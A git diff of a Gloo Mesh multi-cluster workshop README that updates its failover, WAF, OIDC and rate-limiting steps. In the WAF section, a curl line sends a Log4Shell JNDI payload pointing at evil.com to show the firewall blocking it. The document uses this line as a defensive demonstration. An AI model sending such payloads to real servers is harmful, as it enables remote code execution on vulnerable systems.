@@ -46,7 +46,7 @@ To get started with this workshop, clone this repo.
 
 ```sh
 git clone https://github.com/solo-io/solo-cop.git
-cd solo-cop/workshops/gloo-mesh-demo && git checkout v1.0.1
+cd solo-cop/workshops/gloo-mesh-demo && git checkout v1.0.2
 ```
 
 Set these environment variables which will be used throughout the workshop.
@@ -68,7 +68,9 @@ You will need to create three Kubernetes Clusters. Two will be used as your work
 
 ![arch-1](images/arch-1.png)
 
-This workshop can run on many different Kubernetes distributions such as EKS, GKE, OpenShift, RKE, etc or you can [create local k3d clusters](./infra/k3d/README.md).
+This workshop can run on many different Kubernetes distributions such as EKS, GKE, OpenShift, RKE, etc or you can 
+* [create local k3d clusters](infra/k3d/README.md)
+* [create eks clusters using eksctl](infra/eks/README.md).
 
 Set these environment variables to represent your three clusters.
 ```sh
@@ -85,12 +87,6 @@ kubectl config rename-context <context-to-rename> ${MGMT}
 kubectl config rename-context <context-to-rename> ${CLUSTER1} 
 kubectl config rename-context <context-to-rename> ${CLUSTER2}
 ``` 
-
-Run the following command to make `mgmt` the current cluster.
-
-```sh
-kubectl config use-context ${MGMT}
-```
 
 ## Lab 2 - Deploy Gloo Mesh <a name="Lab-2"></a>
 
@@ -280,9 +276,7 @@ EOF
 3. Apply the settings for each workspace. These `WorkspaceSettings` objects are used to tune each indiviual workspace as well as import/export resources from other workspaces. 
 
 ```sh
-kubectl apply --context $MGMT -f tracks/02-workspaces/workspace-settings-ops-team.yaml
-kubectl apply --context $MGMT -f tracks/02-workspaces/workspace-settings-web-team.yaml
-kubectl apply --context $MGMT -f tracks/02-workspaces/workspace-settings-backend-apis-team.yaml
+kubectl apply --context $MGMT -f tracks/02-workspaces/workspace-settings.yaml
 ```
 
 The `WorkspaceSettings` custom resource lets each team define the services and gateways that they want other workspaces from other teams to be able to access. This way, you can control the discovery of services in your service mesh and enable each team to access only what they need.
@@ -430,7 +424,7 @@ EOF
 
 ![Without Checkout Feature](images/checkout-feature-error.png)
 
-This is because checkout microservice is not deploy yet! See `kubectl get deployments -n backend-apis --context $CLUSTER1`
+This is because checkout microservice is not deployed yet! See `kubectl get deployments -n backend-apis --context $CLUSTER1`
 
 ## Lab 8 - Multi Cluster Routing <a name="Lab-8"></a>
 
@@ -470,7 +464,7 @@ spec:
 EOF
 ```
 
-3. Lets go ahead and create VirtualDestinations for currency, shipping and cart services as well.
+3. Lets go ahead and create VirtualDestinations for the other backend api services as well.
 
 ```sh
 kubectl apply --context $MGMT -f tracks/04-multi-cluster-routing/virtual-destinations.yaml
@@ -519,13 +513,7 @@ spec:
 EOF
 ```
 
-3. Create VirtualDestinations for the rest of the backend-apis so the cluster2 frontend can reach them
-
-```sh
-kubectl --context ${MGMT} apply -f tracks/05-failover/backend-apis-virtual-destinations.yaml
-```
-
-4. Update the RouteTable so the VirtualGateway will route to both frontend applications. This can be accomplished by simply routing to the frontend's VirtualDestination.
+3. Update the RouteTable so the VirtualGateway will route to both frontend applications. This can be accomplished by simply routing to the frontend's VirtualDestination.
 
 ```yaml
 kubectl --context ${MGMT} apply -f - <<'EOF'
@@ -546,6 +534,8 @@ spec:
   workloadSelectors: []
   http:
     - name: frontend
+      labels:
+        virtual-destination: frontend
       forwardTo:
         destinations:
           - ref:
@@ -562,7 +552,7 @@ Review the following update to the `RouteTable` resource. You must configure the
    * The route table selects the ingress gateway to use. This gateway is in a workspace that the route table's workspace exports to.
    * The `frontend` route is set up to forward to destinations of the kind `VIRTUAL_DESTINATION`. It selects the virtual destination that you created by name and namespace.
 
-5. Test routing between frontend services by refreshing your Online Boutique webpage several times. You should see both cluster1 and cluster2.
+4. Test routing between frontend services by refreshing your Online Boutique webpage several times. You should see both cluster1 and cluster2.
 
 * cluster1 header
 ![cluster1 header](images/cluster1-frontend-header.png)
@@ -576,7 +566,7 @@ Review the following update to the `RouteTable` resource. You must configure the
 for i in {1..6}; do curl -sSk http://$HTTP_GATEWAY_ENDPOINT | grep "Cluster Name:"; done
 ```
 
-6. You can create a Gloo Mesh `FailoverPolicy` custom resource to configure locality-based load balancing across your virtual destinations. Apply this policy now.
+5. You can create a Gloo Mesh `FailoverPolicy` custom resource to configure locality-based load balancing across your virtual destinations. Apply this policy now.
 
 ```yaml
 kubectl --context ${MGMT} apply -f - <<'EOF'
@@ -591,21 +581,14 @@ spec:
     selector:
       namespace: web-team
   config:
-    localityMappings:
-    - from:
-        region: us-east-1
-      to:
-        - region: us-west-2
-    - from:
-        region: us-west-2
-      to: 
-        - region: us-east-1
+    # enable default locality based load balancing
+    localityMappings: []
 EOF
 ```
    * The policy applies to destinations of the kind `VIRTUAL_DESTINATION`. It selects the virtual destination that you created by label.
    * The policy configures locality mapping. Requests from the us-east-1 region are mapped to us-west-2, and vice versa. This way, if a request cannot be fulfilled by an app in that region first, it is sent to the next closest region.
 
-7. The failover policy tells Gloo Mesh _where_ to re-route failover traffic. But, you also need to tell Gloo Mesh _when_. To do so, create an outlier detection policy. This policy sets up several conditions, such as retries and ejection percentages, for Gloo Mesh to use before failing over traffic.
+6. The failover policy tells Gloo Mesh _where_ to re-route failover traffic. But, you also need to tell Gloo Mesh _when_. To do so, create an outlier detection policy. This policy sets up several conditions, such as retries and ejection percentages, for Gloo Mesh to use before failing over traffic.
 
 ```yaml
 kubectl --context ${MGMT} apply -f - <<'EOF'
@@ -631,21 +614,21 @@ EOF
    * `maxEjectionPercent`: The percentage of traffic to fail over.
    * `baseEjectionTime`: The timeout to use to try to route back to the local service, after Kubernetes detects the service is healthy again.
 
-8. Purposefully break the frontend microservice on cluster1 so that it cannot respond to requests. This command tells the container to sleep.
+7. Purposefully break the frontend microservice on cluster1 so that it cannot respond to requests. This command tells the container to sleep.
 
 ```sh
 kubectl --context $CLUSTER1 -n web-ui patch deploy frontend --patch '{"spec":{"template":{"spec":{"containers":[{"name":"server","command":["sleep","20h"],"readinessProbe":null,"livenessProbe":null}]}}}}'
 ```
 
-9. Test failover to cluster2 frontend application by refreshing your Online Boutique webpage several times. You should always see cluster2.
+8. Test failover to cluster2 frontend application by refreshing your Online Boutique webpage several times. You should always see cluster2.
 
-10. Fix frontend in cluster1
+9. Fix frontend in cluster1
 
 ```sh
 kubectl --context $CLUSTER1 -n web-ui patch deploy frontend --patch '{"spec":{"template":{"spec":{"containers":[{"name":"server","command":[],"readinessProbe":null,"livenessProbe":null}]}}}}'
 ```
 
-11. Wait a few seconds and test that the frontend in cluster1 is working again.
+10. Wait a few seconds and test that the frontend in cluster1 is working again.
 
 ## Lab 10 - API Gateway <a name="Lab-10"></a>
 
@@ -672,12 +655,8 @@ helm upgrade --install gloo-mesh-agent-addons gloo-mesh-agent/gloo-mesh-agent \
   --set rate-limiter.enabled=true \
   --set ext-auth-service.enabled=true \
   --version $GLOO_MESH_VERSION
-```
 
-2. Update the workspace settings to import and export the `gloo-mesh-addons`
-
-```
-kubectl apply -f tracks/06-api-gateway/workspace-settings.yaml --context $MGMT
+kubectl apply -f tracks/06-api-gateway/gloo-mesh-addons-servers.yaml --context $MGMT
 ```
 
 #### Web Application Firewall (WAF)
@@ -697,37 +676,11 @@ curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://$HTTP_GATEWAY
 
 3. With the Gloo Mesh WAF policy custom resource, you can create reusable policies for ModSecurity. Review the `log4j` WAF policy and the frontend route table. Note the following settings.
 
-  * In the route table, the frontend route has the label `waf: "true"`. The WAF policy applies to routes with this same label.
+  * In the route table, the frontend route has the label `virtual-destination: frontend`. The WAF policy applies to routes with this same label.
   * In the WAF policy config, the default core rule set is disabled. Instead, a custom rule set is created for the `log4j` attack.
 
 ```yaml
 kubectl --context ${MGMT} apply -f - <<'EOF'
-apiVersion: networking.gloo.solo.io/v2
-kind: RouteTable
-metadata:
-  name: frontend
-  namespace: web-team
-spec:
-  hosts:
-    - '*'
-  virtualGateways:
-    - name: north-south-gw
-      namespace: ops-team
-      cluster: mgmt
-  workloadSelectors: []
-  http:
-    - name: frontend
-      labels:
-        waf: "true" ##### NOTE
-      forwardTo:
-        destinations:
-          - ref:
-              name: frontend
-              namespace: web-ui
-              cluster: cluster1
-            port:
-              number: 80
----
 apiVersion: security.policy.gloo.solo.io/v2
 kind: WAFPolicy
 metadata:
@@ -737,7 +690,7 @@ spec:
   applyToRoutes:
   - route:
       labels:
-        waf: "true" ##### NOTE
+        virtual-destination: frontend ##### NOTE
   config:
     disableCoreRuleSet: true
     customInterventionMessage: 'Log4Shell malicious payload'
@@ -771,7 +724,6 @@ Log4Shell malicious payload
 
 Your frontend app is no longer susceptible to `log4j` attacks, nice!
 
-
 #### External Authorization (OIDC)
 
 Another valuable feature of API gateways is integration into your IdP (Identity Provider). In this section of the lab, we see how Gloo Mesh Gateway can be configured to redirect unauthenticated users via OIDC.  We will use Keycloak as our IdP, but you could use other OIDC-compliant providers in your production clusters.
@@ -786,7 +738,6 @@ kubectl --context ${CLUSTER1} -n istio-gateways create secret generic tls-secret
 --from-file=tls.key=tls.key \
 --from-file=tls.crt=tls.crt
 ```
-
 
 2. Adding HTTPS to our gateway is simple as updating the virtual gateway to use our ssl certificate
 ```yaml
@@ -844,12 +795,14 @@ Get the keycloak URL and Client ID.
 ```sh
 export KEYCLOAK_URL=$(kubectl get configmap -n gloo-mesh --context $CLUSTER1 keycloak-info -o json | jq -r '.data."keycloak-url"')
 export KEYCLOAK_CLIENTID=$(kubectl get configmap -n gloo-mesh --context $CLUSTER1 keycloak-info -o json | jq -r '.data."client-id"')
-```
 
+echo "Keycloak available at: $KEYCLOAK_URL"
+echo "Keycloak OIDC ClientID: $KEYCLOAK_CLIENTID"
+```
 
 The `ExtAuthPolicy` defines the provider connectivity including any callback paths that we need to configure on our application.
 
-* View the `ExtAuthPolicy` with environment variables replaced
+* View the `ExtAuthPolicy` with environment variables replaced.
 
 ```sh
 ( echo "cat <<EOF" ; cat tracks/06-api-gateway/ext-auth-policy.yaml ; echo EOF ) | sh
@@ -861,73 +814,16 @@ The `ExtAuthPolicy` defines the provider connectivity including any callback pat
 ( echo "cat <<EOF" ; cat tracks/06-api-gateway/ext-auth-policy.yaml ; echo EOF ) | sh | kubectl apply -n web-team --context $MGMT -f -
 ```
 
-An `ExtAuthServer` is also required to define the external auth server destination we want to use.  We will use the ext-auth-server in the gloo-mesh-addons namespace.
-
-* Apply the `ExtAuthServer`
-
-```yaml
-kubectl --context ${MGMT} apply -f - <<'EOF'
-apiVersion: admin.gloo.solo.io/v2
-kind: ExtAuthServer
-metadata:
-  name: ext-auth-server
-  namespace: web-team
-spec:
-  destinationServer:
-    ref:
-      cluster: cluster1
-      name: ext-auth-service
-      namespace: gloo-mesh-addons
-    port:
-      name: grpc
-EOF
-```
-
-Associating this `ExtAuthPolicy` with the gateway `RouteTable` will ensure that the policy is enforced.
-
-* Apply the `RouteTable`
-
-```sh
-kubectl --context ${MGMT} apply -f - <<'EOF'
-apiVersion: networking.gloo.solo.io/v2
-kind: RouteTable
-metadata:
-  name: frontend
-  namespace: web-team
-spec:
-  hosts:
-    - '*'
-  virtualGateways:
-    - name: north-south-gw
-      namespace: ops-team
-      cluster: mgmt
-  workloadSelectors: []
-  http:
-    - name: main-page
-      labels:
-        oauth: "true"
-      forwardTo:
-        destinations:
-          - ref:
-              name: frontend
-              namespace: web-ui
-              cluster: cluster1
-            port:
-              number: 80
-EOF
-```
-
 Now if you refresh the application, you should be redirected to Keycloak to login.
 
 * Login using the following credentials
 
 ```sh
 user: gloo-mesh
-password: solo
+password: solo.io
 ```
 
 * To logout simply call the `/logout` endpoint in your browser
-
 
 ```sh
 echo "Logout URL: https://$ENDPOINT_HTTPS_GW_CLUSTER1_EXT/logout"
@@ -949,20 +845,6 @@ The `RateLimitPolicy` pulls together the `RateLimitClientConfig`, `RateLimitServ
 
 ```yaml
 kubectl --context ${MGMT} apply -f - <<'EOF'
-apiVersion: admin.gloo.solo.io/v2
-kind: RateLimitServerSettings
-metadata:
-  name: rate-limit-server-settings
-  namespace: web-team
-spec:
-  destinationServer:
-    port:
-      number: 8083
-    ref:
-      name: rate-limiter
-      namespace: gloo-mesh-addons
-      cluster: cluster1
----
 apiVersion: trafficcontrol.policy.gloo.solo.io/v2
 kind: RateLimitClientConfig
 metadata:
@@ -1027,36 +909,8 @@ EOF
 * Because its hard to validate rate limiting with authentication on we will disable external authentication for now.
 
 ```sh
-kubectl --context ${MGMT} apply -f - <<'EOF'
-apiVersion: networking.gloo.solo.io/v2
-kind: RouteTable
-metadata:
-  name: frontend
-  namespace: web-team
-spec:
-  hosts:
-    - '*'
-  virtualGateways:
-    - name: north-south-gw
-      namespace: ops-team
-      cluster: mgmt
-  workloadSelectors: []
-  http:
-    - name: main-page
-      labels:
-        oauth: "false"
-      forwardTo:
-        destinations:
-          - ref:
-              name: frontend
-              namespace: web-ui
-              cluster: cluster1
-            port:
-              number: 80
-EOF
+kubectl --context ${MGMT} delete ExtAuthPolicy frontend -n web-team
 ```
-
-
 
 * Test Rate Limiting
 
